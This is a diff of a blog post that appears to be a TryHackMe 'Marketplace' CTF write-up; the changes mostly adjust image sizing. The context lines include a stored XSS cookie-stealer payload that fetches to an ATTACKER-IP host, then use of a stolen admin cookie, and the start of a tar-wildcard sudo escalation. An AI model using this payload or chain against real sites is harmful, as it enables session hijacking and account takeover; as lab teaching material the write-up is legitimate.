@@ -45,7 +45,7 @@ If the above information does not make sense, try going through TryHackMe's [XSS
 
 Cookies have many uses, but are most commonly used for website authentication. They don't have a plaintext format, so we can't see the password, but they come in the form of a **token**, a unique secret code that isn't easily humanly guessable.
 
-![cookie-auth](https://media.geeksforgeeks.org/wp-content/uploads/20211206163821/Group2copy-660x330.jpg)
+![cookie-auth](https://media.geeksforgeeks.org/wp-content/uploads/20211206163821/Group2copy-660x330.jpg){: .normal}
 
 As always, there is the [HTTP in detail](https://tryhackme.com/room/httpindetail) room which is dedicated to the **HTTP protocol**, and I would highly suggest to go through that as well! 
 
@@ -73,13 +73,13 @@ The process of an SQLi is explained in great detail, in a step-by-step fashion, 
 
 Let's start by visiting the website:
 
-![marketplace_homepage](marketplace_homepage.png)
+![marketplace_homepage](marketplace_homepage.png){: .normal width="70%"}
 
  One of the first things we always do, is checking if there is a [`/robots.txt`](https://moz.com/learn/seo/robotstxt) subdirectory, and in this case there is! It tells us that there is an disallowed `/admin` location, and, as expected, we are not authorized to view it; yet! 
 
-![robots-txt](robots-txt.png)
+![robots-txt](robots-txt.png){: .normal width="70%"}
 
-![admin-dir-no-auth](admin-dir-not-auth.png)
+![admin-dir-no-auth](admin-dir-not-auth.png){: .normal width="70%"}
 
 While exploring the site, there are some more things to note down:
 
@@ -90,11 +90,11 @@ Let's start by checking the first point:
 
 When trying to log in with random creds, for example, `admin:admin`, we got the following message:
 
-![user-not-found-error](user-not-found-error.png)
+![user-not-found-error](user-not-found-error.png){: .normal}
 
 The images found on the homepage are having their publishers listed, `michael` and `jake`. If we try to login in with either of the two, we get this:
 
-![invalid-password](invalid-password.png)
+![invalid-password](invalid-password.png){: .normal}
 
 So we already have two **valid usernames** at hand, and we could try a *dictionary attack with **hydra** to see if we can find their passwords, a similar process we did at the [Mr Robot](https://cspanias.github.io/posts/Mr-Robot-Write-Up-(2023)/#23-dictionary-attack-with-hydra) room, but, unfortunately, it does not work this time.
 
@@ -131,11 +131,11 @@ The plan is as follows:
     <script>fetch("http://ATTACKER-IP:12345/"+document.cookie)</script>
     ```
 
-    ![cookie-stealer](cookie-stealer.png)
+    ![cookie-stealer](cookie-stealer.png){: .normal width="70%"}
 
 3. Now, we need a way to **"force" an admin to interact with our listing**. That is because we want the code to be executed on the admin's browser, and not ours. This is where the reporting hint comes handy. We can create a new listing, report it, and then an admin should come and review it.
 
-    ![report-to-admin](report-to-admin.jpg){: width="50%"}
+    ![report-to-admin](report-to-admin.jpg){: .normal width="50%"}
 
 4. When we click *Report*, we get a message *From System* saying among others: "*One of our admins will evaluate...*". We should have received our session cookie on the python server by now. After a few seconds, we refresh the page, and we have a new message that our post has been reviewed. Alongside that, we also got the admin's cookie!
 
@@ -156,7 +156,7 @@ The plan is as follows:
 
 6. Once we refresh the page, the **Administration panel** appears, which includes our first 🚩🍻!
 
-    ![admin-panel](admin-panel.jpg)
+    ![admin-panel](admin-panel.jpg){: .normal}
 
 ### 3.2 IDOR & SQLi
 
@@ -265,7 +265,7 @@ find / -name user.txt -type f 2>/dev/null
 
 Lo and behold, the second 🚩 is just there waiting us!
 
-![flag2](second-flag.jpg)
+![flag2](second-flag.jpg){: .normal width="65%"}
 
 Let's check if user `jake` have any SUDO privileges:
 
@@ -273,7 +273,7 @@ Let's check if user `jake` have any SUDO privileges:
 
 It seems that `jake`, can run the `/opt/backups/backup.sh` file with the perimissions of user `michael`, who is its owner. Upon closer inspection of the file's contents, its job seems pretty straightforward:
 
-![backup-sh-script](backup-sh.png)
+![backup-sh-script](backup-sh.png){: .normal}
 
 1. It creates a **tar archive** named `backup.tar`, using the `tar cf /opt/backups/backup.tar` command.
 2. Instead of archiving a specified file, for instance, `tar cf /opt/backups/backup.tar backup.sh`, it uses the wildcard character, `*`, which means that it is archiving all files within the directory.
